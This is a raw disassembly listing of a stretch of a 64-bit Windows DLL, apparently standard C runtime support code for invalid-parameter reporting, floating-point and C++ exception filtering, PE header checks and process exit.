   180006421:	49 8b c3             	mov    %r11,%rax
   180006424:	c3                   	ret
   180006425:	cc                   	int3
   180006426:	cc                   	int3
   180006427:	cc                   	int3
   180006428:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   18000642d:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180006432:	55                   	push   %rbp
   180006433:	57                   	push   %rdi
   180006434:	41 56                	push   %r14
   180006436:	48 8d ac 24 10 fb ff 	lea    -0x4f0(%rsp),%rbp
   18000643d:	ff 
   18000643e:	48 81 ec f0 05 00 00 	sub    $0x5f0,%rsp
   180006445:	48 8b 05 c4 3b 01 00 	mov    0x13bc4(%rip),%rax        # 0x18001a010
   18000644c:	48 33 c4             	xor    %rsp,%rax
   18000644f:	48 89 85 e0 04 00 00 	mov    %rax,0x4e0(%rbp)
   180006456:	41 8b f8             	mov    %r8d,%edi
   180006459:	8b f2                	mov    %edx,%esi
   18000645b:	8b d9                	mov    %ecx,%ebx
   18000645d:	83 f9 ff             	cmp    $0xffffffff,%ecx
   180006460:	74 05                	je     0x180006467
   180006462:	e8 15 c2 ff ff       	call   0x18000267c
   180006467:	33 d2                	xor    %edx,%edx
   180006469:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   18000646e:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   180006474:	e8 07 d2 ff ff       	call   0x180003680
   180006479:	33 d2                	xor    %edx,%edx
   18000647b:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   18000647f:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   180006485:	e8 f6 d1 ff ff       	call   0x180003680
   18000648a:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   18000648f:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   180006494:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   180006498:	48 8d 45 10          	lea    0x10(%rbp),%rax
   18000649c:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1800064a1:	ff 15 79 9b 00 00    	call   *0x9b79(%rip)        # 0x180010020
   1800064a7:	4c 8b b5 08 01 00 00 	mov    0x108(%rbp),%r14
   1800064ae:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   1800064b3:	49 8b ce             	mov    %r14,%rcx
   1800064b6:	45 33 c0             	xor    %r8d,%r8d
   1800064b9:	ff 15 69 9b 00 00    	call   *0x9b69(%rip)        # 0x180010028
   1800064bf:	48 85 c0             	test   %rax,%rax
   1800064c2:	74 36                	je     0x1800064fa
   1800064c4:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   1800064ca:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1800064cf:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   1800064d4:	4c 8b c8             	mov    %rax,%r9
   1800064d7:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   1800064dc:	4d 8b c6             	mov    %r14,%r8
   1800064df:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1800064e4:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1800064e9:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   1800064ed:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1800064f2:	33 c9                	xor    %ecx,%ecx
   1800064f4:	ff 15 36 9b 00 00    	call   *0x9b36(%rip)        # 0x180010030
   1800064fa:	48 8b 85 08 05 00 00 	mov    0x508(%rbp),%rax
   180006501:	48 89 85 08 01 00 00 	mov    %rax,0x108(%rbp)
   180006508:	48 8d 85 08 05 00 00 	lea    0x508(%rbp),%rax
   18000650f:	48 83 c0 08          	add    $0x8,%rax
   180006513:	89 74 24 70          	mov    %esi,0x70(%rsp)
   180006517:	48 89 85 a8 00 00 00 	mov    %rax,0xa8(%rbp)
   18000651e:	48 8b 85 08 05 00 00 	mov    0x508(%rbp),%rax
   180006525:	48 89 45 80          	mov    %rax,-0x80(%rbp)
   180006529:	89 7c 24 74          	mov    %edi,0x74(%rsp)
   18000652d:	ff 15 2d 9b 00 00    	call   *0x9b2d(%rip)        # 0x180010060
   180006533:	33 c9                	xor    %ecx,%ecx
   180006535:	8b f8                	mov    %eax,%edi
   180006537:	ff 15 03 9b 00 00    	call   *0x9b03(%rip)        # 0x180010040
   18000653d:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   180006542:	ff 15 f0 9a 00 00    	call   *0x9af0(%rip)        # 0x180010038
   180006548:	85 c0                	test   %eax,%eax
   18000654a:	75 10                	jne    0x18000655c
   18000654c:	85 ff                	test   %edi,%edi
   18000654e:	75 0c                	jne    0x18000655c
   180006550:	83 fb ff             	cmp    $0xffffffff,%ebx
   180006553:	74 07                	je     0x18000655c
   180006555:	8b cb                	mov    %ebx,%ecx
   180006557:	e8 20 c1 ff ff       	call   0x18000267c
   18000655c:	48 8b 8d e0 04 00 00 	mov    0x4e0(%rbp),%rcx
   180006563:	48 33 cc             	xor    %rsp,%rcx
   180006566:	e8 55 b5 ff ff       	call   0x180001ac0
   18000656b:	4c 8d 9c 24 f0 05 00 	lea    0x5f0(%rsp),%r11
   180006572:	00 
   180006573:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   180006577:	49 8b 73 30          	mov    0x30(%r11),%rsi
   18000657b:	49 8b e3             	mov    %r11,%rsp
   18000657e:	41 5e                	pop    %r14
   180006580:	5f                   	pop    %rdi
   180006581:	5d                   	pop    %rbp
   180006582:	c3                   	ret
   180006583:	cc                   	int3
   180006584:	48 89 0d d5 4c 01 00 	mov    %rcx,0x14cd5(%rip)        # 0x18001b260
   18000658b:	c3                   	ret
   18000658c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180006591:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180006596:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000659b:	57                   	push   %rdi
   18000659c:	48 83 ec 30          	sub    $0x30,%rsp
   1800065a0:	41 8b d9             	mov    %r9d,%ebx
   1800065a3:	49 8b f8             	mov    %r8,%rdi
   1800065a6:	48 8b f2             	mov    %rdx,%rsi
   1800065a9:	48 8b e9             	mov    %rcx,%rbp
   1800065ac:	e8 73 19 00 00       	call   0x180007f24
   1800065b1:	48 85 c0             	test   %rax,%rax
   1800065b4:	74 3d                	je     0x1800065f3
   1800065b6:	48 8b 80 b8 03 00 00 	mov    0x3b8(%rax),%rax
   1800065bd:	48 85 c0             	test   %rax,%rax
   1800065c0:	74 31                	je     0x1800065f3
   1800065c2:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   1800065c7:	44 8b cb             	mov    %ebx,%r9d
   1800065ca:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   1800065cf:	4c 8b c7             	mov    %rdi,%r8
   1800065d2:	48 8b d6             	mov    %rsi,%rdx
   1800065d5:	48 8b cd             	mov    %rbp,%rcx
   1800065d8:	ff 15 8a 9c 00 00    	call   *0x9c8a(%rip)        # 0x180010268
   1800065de:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1800065e3:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   1800065e8:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   1800065ed:	48 83 c4 30          	add    $0x30,%rsp
   1800065f1:	5f                   	pop    %rdi
   1800065f2:	c3                   	ret
   1800065f3:	4c 8b 15 16 3a 01 00 	mov    0x13a16(%rip),%r10        # 0x18001a010
   1800065fa:	44 8b cb             	mov    %ebx,%r9d
   1800065fd:	41 8b ca             	mov    %r10d,%ecx
   180006600:	4c 8b c7             	mov    %rdi,%r8
   180006603:	4c 33 15 56 4c 01 00 	xor    0x14c56(%rip),%r10        # 0x18001b260
   18000660a:	83 e1 3f             	and    $0x3f,%ecx
   18000660d:	49 d3 ca             	ror    %cl,%r10
   180006610:	48 8b d6             	mov    %rsi,%rdx
   180006613:	4d 85 d2             	test   %r10,%r10
   180006616:	74 0f                	je     0x180006627
   180006618:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   18000661d:	49 8b c2             	mov    %r10,%rax
   180006620:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   180006625:	eb ae                	jmp    0x1800065d5
   180006627:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   18000662c:	48 8b cd             	mov    %rbp,%rcx
   18000662f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180006634:	e8 53 00 00 00       	call   0x18000668c
   180006639:	cc                   	int3
   18000663a:	cc                   	int3
   18000663b:	cc                   	int3
   18000663c:	48 83 ec 38          	sub    $0x38,%rsp
   180006640:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   180006646:	45 33 c9             	xor    %r9d,%r9d
   180006649:	45 33 c0             	xor    %r8d,%r8d
   18000664c:	33 d2                	xor    %edx,%edx
   18000664e:	33 c9                	xor    %ecx,%ecx
   180006650:	e8 37 ff ff ff       	call   0x18000658c
   180006655:	48 83 c4 38          	add    $0x38,%rsp
   180006659:	c3                   	ret
   18000665a:	cc                   	int3
   18000665b:	cc                   	int3
   18000665c:	48 83 ec 38          	sub    $0x38,%rsp
   180006660:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   180006666:	45 33 c9             	xor    %r9d,%r9d
   180006669:	45 33 c0             	xor    %r8d,%r8d
   18000666c:	33 d2                	xor    %edx,%edx
   18000666e:	33 c9                	xor    %ecx,%ecx
   180006670:	e8 17 ff ff ff       	call   0x18000658c
   180006675:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   18000667b:	45 33 c9             	xor    %r9d,%r9d
   18000667e:	45 33 c0             	xor    %r8d,%r8d
   180006681:	33 d2                	xor    %edx,%edx
   180006683:	33 c9                	xor    %ecx,%ecx
   180006685:	e8 02 00 00 00       	call   0x18000668c
   18000668a:	cc                   	int3
   18000668b:	cc                   	int3
   18000668c:	48 83 ec 28          	sub    $0x28,%rsp
   180006690:	b9 17 00 00 00       	mov    $0x17,%ecx
   180006695:	ff 15 bd 99 00 00    	call   *0x99bd(%rip)        # 0x180010058
   18000669b:	85 c0                	test   %eax,%eax
   18000669d:	74 07                	je     0x1800066a6
   18000669f:	b9 05 00 00 00       	mov    $0x5,%ecx
   1800066a4:	cd 29                	int    $0x29
   1800066a6:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1800066ac:	ba 17 04 00 c0       	mov    $0xc0000417,%edx
   1800066b1:	41 8d 48 01          	lea    0x1(%r8),%ecx
   1800066b5:	e8 6e fd ff ff       	call   0x180006428
   1800066ba:	ff 15 88 99 00 00    	call   *0x9988(%rip)        # 0x180010048
   1800066c0:	48 8b c8             	mov    %rax,%rcx
   1800066c3:	ba 17 04 00 c0       	mov    $0xc0000417,%edx
   1800066c8:	48 83 c4 28          	add    $0x28,%rsp
   1800066cc:	48 ff 25 7d 99 00 00 	rex.W jmp *0x997d(%rip)        # 0x180010050
   1800066d3:	cc                   	int3
   1800066d4:	b8 63 73 6d e0       	mov    $0xe06d7363,%eax
   1800066d9:	3b c8                	cmp    %eax,%ecx
   1800066db:	74 03                	je     0x1800066e0
   1800066dd:	33 c0                	xor    %eax,%eax
   1800066df:	c3                   	ret
   1800066e0:	8b c8                	mov    %eax,%ecx
   1800066e2:	e9 01 00 00 00       	jmp    0x1800066e8
   1800066e7:	cc                   	int3
   1800066e8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800066ed:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1800066f2:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1800066f7:	57                   	push   %rdi
   1800066f8:	48 83 ec 20          	sub    $0x20,%rsp
   1800066fc:	48 8b f2             	mov    %rdx,%rsi
   1800066ff:	8b f9                	mov    %ecx,%edi
   180006701:	e8 1e 18 00 00       	call   0x180007f24
   180006706:	45 33 c9             	xor    %r9d,%r9d
   180006709:	48 8b d8             	mov    %rax,%rbx
   18000670c:	48 85 c0             	test   %rax,%rax
   18000670f:	0f 84 3e 01 00 00    	je     0x180006853
   180006715:	48 8b 08             	mov    (%rax),%rcx
   180006718:	48 8b c1             	mov    %rcx,%rax
   18000671b:	4c 8d 81 c0 00 00 00 	lea    0xc0(%rcx),%r8
   180006722:	49 3b c8             	cmp    %r8,%rcx
   180006725:	74 0d                	je     0x180006734
   180006727:	39 38                	cmp    %edi,(%rax)
   180006729:	74 0c                	je     0x180006737
   18000672b:	48 83 c0 10          	add    $0x10,%rax
   18000672f:	49 3b c0             	cmp    %r8,%rax
   180006732:	75 f3                	jne    0x180006727
   180006734:	49 8b c1             	mov    %r9,%rax
   180006737:	48 85 c0             	test   %rax,%rax
   18000673a:	0f 84 13 01 00 00    	je     0x180006853
   180006740:	4c 8b 40 08          	mov    0x8(%rax),%r8
   180006744:	4d 85 c0             	test   %r8,%r8
   180006747:	0f 84 06 01 00 00    	je     0x180006853
   18000674d:	49 83 f8 05          	cmp    $0x5,%r8
   180006751:	75 0d                	jne    0x180006760
   180006753:	4c 89 48 08          	mov    %r9,0x8(%rax)
   180006757:	41 8d 40 fc          	lea    -0x4(%r8),%eax
   18000675b:	e9 f5 00 00 00       	jmp    0x180006855
   180006760:	49 83 f8 01          	cmp    $0x1,%r8
   180006764:	75 08                	jne    0x18000676e
   180006766:	83 c8 ff             	or     $0xffffffff,%eax
   180006769:	e9 e7 00 00 00       	jmp    0x180006855
   18000676e:	48 8b 6b 08          	mov    0x8(%rbx),%rbp
   180006772:	48 89 73 08          	mov    %rsi,0x8(%rbx)
   180006776:	83 78 04 08          	cmpl   $0x8,0x4(%rax)
   18000677a:	0f 85 ba 00 00 00    	jne    0x18000683a
   180006780:	48 83 c1 30          	add    $0x30,%rcx
   180006784:	48 8d 91 90 00 00 00 	lea    0x90(%rcx),%rdx
   18000678b:	eb 08                	jmp    0x180006795
   18000678d:	4c 89 49 08          	mov    %r9,0x8(%rcx)
   180006791:	48 83 c1 10          	add    $0x10,%rcx
   180006795:	48 3b ca             	cmp    %rdx,%rcx
   180006798:	75 f3                	jne    0x18000678d
   18000679a:	81 38 8d 00 00 c0    	cmpl   $0xc000008d,(%rax)
   1800067a0:	8b 7b 10             	mov    0x10(%rbx),%edi
   1800067a3:	74 7a                	je     0x18000681f
   1800067a5:	81 38 8e 00 00 c0    	cmpl   $0xc000008e,(%rax)
   1800067ab:	74 6b                	je     0x180006818
   1800067ad:	81 38 8f 00 00 c0    	cmpl   $0xc000008f,(%rax)
   1800067b3:	74 5c                	je     0x180006811
   1800067b5:	81 38 90 00 00 c0    	cmpl   $0xc0000090,(%rax)
   1800067bb:	74 4d                	je     0x18000680a
   1800067bd:	81 38 91 00 00 c0    	cmpl   $0xc0000091,(%rax)
   1800067c3:	74 3e                	je     0x180006803
   1800067c5:	81 38 92 00 00 c0    	cmpl   $0xc0000092,(%rax)
   1800067cb:	74 2f                	je     0x1800067fc
   1800067cd:	81 38 93 00 00 c0    	cmpl   $0xc0000093,(%rax)
   1800067d3:	74 20                	je     0x1800067f5
   1800067d5:	81 38 b4 02 00 c0    	cmpl   $0xc00002b4,(%rax)
   1800067db:	74 11                	je     0x1800067ee
   1800067dd:	81 38 b5 02 00 c0    	cmpl   $0xc00002b5,(%rax)
   1800067e3:	8b d7                	mov    %edi,%edx
   1800067e5:	75 40                	jne    0x180006827
   1800067e7:	ba 8d 00 00 00       	mov    $0x8d,%edx
   1800067ec:	eb 36                	jmp    0x180006824
   1800067ee:	ba 8e 00 00 00       	mov    $0x8e,%edx
   1800067f3:	eb 2f                	jmp    0x180006824
   1800067f5:	ba 85 00 00 00       	mov    $0x85,%edx
   1800067fa:	eb 28                	jmp    0x180006824
   1800067fc:	ba 8a 00 00 00       	mov    $0x8a,%edx
   180006801:	eb 21                	jmp    0x180006824
   180006803:	ba 84 00 00 00       	mov    $0x84,%edx
   180006808:	eb 1a                	jmp    0x180006824
   18000680a:	ba 81 00 00 00       	mov    $0x81,%edx
   18000680f:	eb 13                	jmp    0x180006824
   180006811:	ba 86 00 00 00       	mov    $0x86,%edx
   180006816:	eb 0c                	jmp    0x180006824
   180006818:	ba 83 00 00 00       	mov    $0x83,%edx
   18000681d:	eb 05                	jmp    0x180006824
   18000681f:	ba 82 00 00 00       	mov    $0x82,%edx
   180006824:	89 53 10             	mov    %edx,0x10(%rbx)
   180006827:	b9 08 00 00 00       	mov    $0x8,%ecx
   18000682c:	49 8b c0             	mov    %r8,%rax
   18000682f:	ff 15 33 9a 00 00    	call   *0x9a33(%rip)        # 0x180010268
   180006835:	89 7b 10             	mov    %edi,0x10(%rbx)
   180006838:	eb 10                	jmp    0x18000684a
   18000683a:	8b 48 04             	mov    0x4(%rax),%ecx
   18000683d:	4c 89 48 08          	mov    %r9,0x8(%rax)
   180006841:	49 8b c0             	mov    %r8,%rax
   180006844:	ff 15 1e 9a 00 00    	call   *0x9a1e(%rip)        # 0x180010268
   18000684a:	48 89 6b 08          	mov    %rbp,0x8(%rbx)
   18000684e:	e9 13 ff ff ff       	jmp    0x180006766
   180006853:	33 c0                	xor    %eax,%eax
   180006855:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000685a:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   18000685f:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180006864:	48 83 c4 20          	add    $0x20,%rsp
   180006868:	5f                   	pop    %rdi
   180006869:	c3                   	ret
   18000686a:	cc                   	int3
   18000686b:	cc                   	int3
   18000686c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180006871:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   180006876:	57                   	push   %rdi
   180006877:	48 83 ec 20          	sub    $0x20,%rsp
   18000687b:	49 8b d9             	mov    %r9,%rbx
   18000687e:	49 8b f8             	mov    %r8,%rdi
   180006881:	8b 0a                	mov    (%rdx),%ecx
   180006883:	e8 10 18 00 00       	call   0x180008098
   180006888:	90                   	nop
   180006889:	48 8b cf             	mov    %rdi,%rcx
   18000688c:	e8 13 00 00 00       	call   0x1800068a4
   180006891:	90                   	nop
   180006892:	8b 0b                	mov    (%rbx),%ecx
   180006894:	e8 53 18 00 00       	call   0x1800080ec
   180006899:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000689e:	48 83 c4 20          	add    $0x20,%rsp
   1800068a2:	5f                   	pop    %rdi
   1800068a3:	c3                   	ret
   1800068a4:	40 53                	rex push %rbx
   1800068a6:	48 83 ec 20          	sub    $0x20,%rsp
   1800068aa:	48 8b d9             	mov    %rcx,%rbx
   1800068ad:	80 3d c4 49 01 00 00 	cmpb   $0x0,0x149c4(%rip)        # 0x18001b278
   1800068b4:	0f 85 9f 00 00 00    	jne    0x180006959
   1800068ba:	b8 01 00 00 00       	mov    $0x1,%eax
   1800068bf:	87 05 a3 49 01 00    	xchg   %eax,0x149a3(%rip)        # 0x18001b268
   1800068c5:	48 8b 01             	mov    (%rcx),%rax
   1800068c8:	8b 08                	mov    (%rax),%ecx
   1800068ca:	85 c9                	test   %ecx,%ecx
   1800068cc:	75 34                	jne    0x180006902
   1800068ce:	48 8b 05 3b 37 01 00 	mov    0x1373b(%rip),%rax        # 0x18001a010
   1800068d5:	8b c8                	mov    %eax,%ecx
   1800068d7:	83 e1 3f             	and    $0x3f,%ecx
   1800068da:	48 8b 15 8f 49 01 00 	mov    0x1498f(%rip),%rdx        # 0x18001b270
   1800068e1:	48 3b d0             	cmp    %rax,%rdx
   1800068e4:	74 13                	je     0x1800068f9
   1800068e6:	48 33 c2             	xor    %rdx,%rax
   1800068e9:	48 d3 c8             	ror    %cl,%rax
   1800068ec:	45 33 c0             	xor    %r8d,%r8d
   1800068ef:	33 d2                	xor    %edx,%edx
   1800068f1:	33 c9                	xor    %ecx,%ecx
   1800068f3:	ff 15 6f 99 00 00    	call   *0x996f(%rip)        # 0x180010268
   1800068f9:	48 8d 0d a8 4a 01 00 	lea    0x14aa8(%rip),%rcx        # 0x18001b3a8
   180006900:	eb 0c                	jmp    0x18000690e
   180006902:	83 f9 01             	cmp    $0x1,%ecx
   180006905:	75 0d                	jne    0x180006914
   180006907:	48 8d 0d b2 4a 01 00 	lea    0x14ab2(%rip),%rcx        # 0x18001b3c0
   18000690e:	e8 19 0b 00 00       	call   0x18000742c
   180006913:	90                   	nop
   180006914:	48 8b 03             	mov    (%rbx),%rax
   180006917:	83 38 00             	cmpl   $0x0,(%rax)
   18000691a:	75 13                	jne    0x18000692f
   18000691c:	48 8d 15 bd 99 00 00 	lea    0x99bd(%rip),%rdx        # 0x1800102e0
   180006923:	48 8d 0d 96 99 00 00 	lea    0x9996(%rip),%rcx        # 0x1800102c0
   18000692a:	e8 cd 0d 00 00       	call   0x1800076fc
   18000692f:	48 8d 15 ba 99 00 00 	lea    0x99ba(%rip),%rdx        # 0x1800102f0
   180006936:	48 8d 0d ab 99 00 00 	lea    0x99ab(%rip),%rcx        # 0x1800102e8
   18000693d:	e8 ba 0d 00 00       	call   0x1800076fc
   180006942:	48 8b 43 08          	mov    0x8(%rbx),%rax
   180006946:	83 38 00             	cmpl   $0x0,(%rax)
   180006949:	75 0e                	jne    0x180006959
   18000694b:	c6 05 26 49 01 00 01 	movb   $0x1,0x14926(%rip)        # 0x18001b278
   180006952:	48 8b 43 10          	mov    0x10(%rbx),%rax
   180006956:	c6 00 01             	movb   $0x1,(%rax)
   180006959:	48 83 c4 20          	add    $0x20,%rsp
   18000695d:	5b                   	pop    %rbx
   18000695e:	c3                   	ret
   18000695f:	e8 3c 0e 00 00       	call   0x1800077a0
   180006964:	90                   	nop
   180006965:	cc                   	int3
   180006966:	cc                   	int3
   180006967:	cc                   	int3
   180006968:	33 c0                	xor    %eax,%eax
   18000696a:	81 f9 63 73 6d e0    	cmp    $0xe06d7363,%ecx
   180006970:	0f 94 c0             	sete   %al
   180006973:	c3                   	ret
   180006974:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180006979:	44 89 44 24 18       	mov    %r8d,0x18(%rsp)
   18000697e:	89 54 24 10          	mov    %edx,0x10(%rsp)
   180006982:	55                   	push   %rbp
   180006983:	48 8b ec             	mov    %rsp,%rbp
   180006986:	48 83 ec 50          	sub    $0x50,%rsp
   18000698a:	8b d9                	mov    %ecx,%ebx
   18000698c:	45 85 c0             	test   %r8d,%r8d
   18000698f:	75 4a                	jne    0x1800069db
   180006991:	33 c9                	xor    %ecx,%ecx
   180006993:	ff 15 d7 96 00 00    	call   *0x96d7(%rip)        # 0x180010070
   180006999:	48 85 c0             	test   %rax,%rax
   18000699c:	74 3d                	je     0x1800069db
   18000699e:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   1800069a3:	66 39 08             	cmp    %cx,(%rax)
   1800069a6:	75 33                	jne    0x1800069db
   1800069a8:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   1800069ac:	48 03 c8             	add    %rax,%rcx
   1800069af:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   1800069b5:	75 24                	jne    0x1800069db
   1800069b7:	b8 0b 02 00 00       	mov    $0x20b,%eax
   1800069bc:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   1800069c0:	75 19                	jne    0x1800069db
   1800069c2:	83 b9 84 00 00 00 0e 	cmpl   $0xe,0x84(%rcx)
   1800069c9:	76 10                	jbe    0x1800069db
   1800069cb:	83 b9 f8 00 00 00 00 	cmpl   $0x0,0xf8(%rcx)
   1800069d2:	74 07                	je     0x1800069db
   1800069d4:	8b cb                	mov    %ebx,%ecx
   1800069d6:	e8 a1 00 00 00       	call   0x180006a7c
   1800069db:	48 8d 45 18          	lea    0x18(%rbp),%rax
   1800069df:	c6 45 28 00          	movb   $0x0,0x28(%rbp)
   1800069e3:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   1800069e7:	4c 8d 4d d4          	lea    -0x2c(%rbp),%r9
   1800069eb:	48 8d 45 20          	lea    0x20(%rbp),%rax
   1800069ef:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   1800069f3:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   1800069f7:	48 8d 45 28          	lea    0x28(%rbp),%rax
   1800069fb:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1800069ff:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   180006a03:	b8 02 00 00 00       	mov    $0x2,%eax
   180006a08:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   180006a0c:	89 45 d4             	mov    %eax,-0x2c(%rbp)
   180006a0f:	89 45 d8             	mov    %eax,-0x28(%rbp)
   180006a12:	e8 55 fe ff ff       	call   0x18000686c
   180006a17:	83 7d 20 00          	cmpl   $0x0,0x20(%rbp)
   180006a1b:	74 0b                	je     0x180006a28
   180006a1d:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   180006a22:	48 83 c4 50          	add    $0x50,%rsp
   180006a26:	5d                   	pop    %rbp
   180006a27:	c3                   	ret
   180006a28:	8b cb                	mov    %ebx,%ecx
   180006a2a:	e8 01 00 00 00       	call   0x180006a30
   180006a2f:	cc                   	int3
   180006a30:	40 53                	rex push %rbx
   180006a32:	48 83 ec 20          	sub    $0x20,%rsp
   180006a36:	8b d9                	mov    %ecx,%ebx
   180006a38:	e8 cb 16 00 00       	call   0x180008108
   180006a3d:	83 f8 01             	cmp    $0x1,%eax
   180006a40:	74 28                	je     0x180006a6a
   180006a42:	65 48 8b 04 25 60 00 	mov    %gs:0x60,%rax
   180006a49:	00 00 
   180006a4b:	8b 90 bc 00 00 00    	mov    0xbc(%rax),%edx
   180006a51:	c1 ea 08             	shr    $0x8,%edx
   180006a54:	f6 c2 01             	test   $0x1,%dl
   180006a57:	75 11                	jne    0x180006a6a
   180006a59:	ff 15 e9 95 00 00    	call   *0x95e9(%rip)        # 0x180010048
   180006a5f:	48 8b c8             	mov    %rax,%rcx
   180006a62:	8b d3                	mov    %ebx,%edx
   180006a64:	ff 15 e6 95 00 00    	call   *0x95e6(%rip)        # 0x180010050
   180006a6a:	8b cb                	mov    %ebx,%ecx
   180006a6c:	e8 0b 00 00 00       	call   0x180006a7c
   180006a71:	8b cb                	mov    %ebx,%ecx
   180006a73:	ff 15 b7 96 00 00    	call   *0x96b7(%rip)        # 0x180010130
   180006a79:	cc                   	int3
   180006a7a:	cc                   	int3
   180006a7b:	cc                   	int3
   180006a7c:	40 53                	rex push %rbx
   180006a7e:	48 83 ec 20          	sub    $0x20,%rsp
   180006a82:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   180006a88:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   180006a8d:	8b d9                	mov    %ecx,%ebx
   180006a8f:	48 8d 15 f2 a9 00 00 	lea    0xa9f2(%rip),%rdx        # 0x180011488
   180006a96:	33 c9                	xor    %ecx,%ecx
   180006a98:	ff 15 9a 96 00 00    	call   *0x969a(%rip)        # 0x180010138
   180006a9e:	85 c0                	test   %eax,%eax
   180006aa0:	74 1f                	je     0x180006ac1
   180006aa2:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   180006aa7:	48 8d 15 f2 a9 00 00 	lea    0xa9f2(%rip),%rdx        # 0x1800114a0
   180006aae:	ff 15 6c 96 00 00    	call   *0x966c(%rip)        # 0x180010120
   180006ab4:	48 85 c0             	test   %rax,%rax
   180006ab7:	74 08                	je     0x180006ac1
   180006ab9:	8b cb                	mov    %ebx,%ecx
   180006abb:	ff 15 a7 97 00 00    	call   *0x97a7(%rip)        # 0x180010268
   180006ac1:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   180006ac6:	48 85 c9             	test   %rcx,%rcx
   180006ac9:	74 06                	je     0x180006ad1
   180006acb:	ff 15 47 96 00 00    	call   *0x9647(%rip)        # 0x180010118
   180006ad1:	48 83 c4 20          	add    $0x20,%rsp
   180006ad5:	5b                   	pop    %rbx
   180006ad6:	c3                   	ret
   180006ad7:	cc                   	int3
   180006ad8:	48 89 0d 91 47 01 00 	mov    %rcx,0x14791(%rip)        # 0x18001b270
   180006adf:	c3                   	ret
   180006ae0:	33 d2                	xor    %edx,%edx
   180006ae2:	33 c9                	xor    %ecx,%ecx
   180006ae4:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   180006ae8:	e9 87 fe ff ff       	jmp    0x180006974
   180006aed:	cc                   	int3
   180006aee:	cc                   	int3
   180006aef:	cc                   	int3
   180006af0:	45 33 c0             	xor    %r8d,%r8d
   180006af3:	41 8d 50 02          	lea    0x2(%r8),%edx
   180006af7:	e9 78 fe ff ff       	jmp    0x180006974
   180006afc:	8b 05 66 47 01 00    	mov    0x14766(%rip),%eax        # 0x18001b268
   180006b02:	c3                   	ret
   180006b03:	cc                   	int3
   180006b04:	48 8b c4             	mov    %rsp,%rax
   180006b07:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180006b0b:	48 89 68 10          	mov    %rbp,0x10(%rax)
   180006b0f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   180006b13:	48 89 78 20          	mov    %rdi,0x20(%rax)
   180006b17:	41 54                	push   %r12
   180006b19:	41 56                	push   %r14
   180006b1b:	41 57                	push   %r15
   180006b1d:	48 83 ec 20          	sub    $0x20,%rsp
   180006b21:	4c 8b 7c 24 60       	mov    0x60(%rsp),%r15
   180006b26:	4d 8b e1             	mov    %r9,%r12
   180006b29:	49 8b d8             	mov    %r8,%rbx
   180006b2c:	4c 8b f2             	mov    %rdx,%r14
   180006b2f:	48 8b f9             	mov    %rcx,%rdi
   180006b32:	49 83 27 00          	andq   $0x0,(%r15)
   180006b36:	49 c7 01 01 00 00 00 	movq   $0x1,(%r9)
   180006b3d:	48 85 d2             	test   %rdx,%rdx
   180006b40:	74 07                	je     0x180006b49
   180006b42:	48 89 1a             	mov    %rbx,(%rdx)
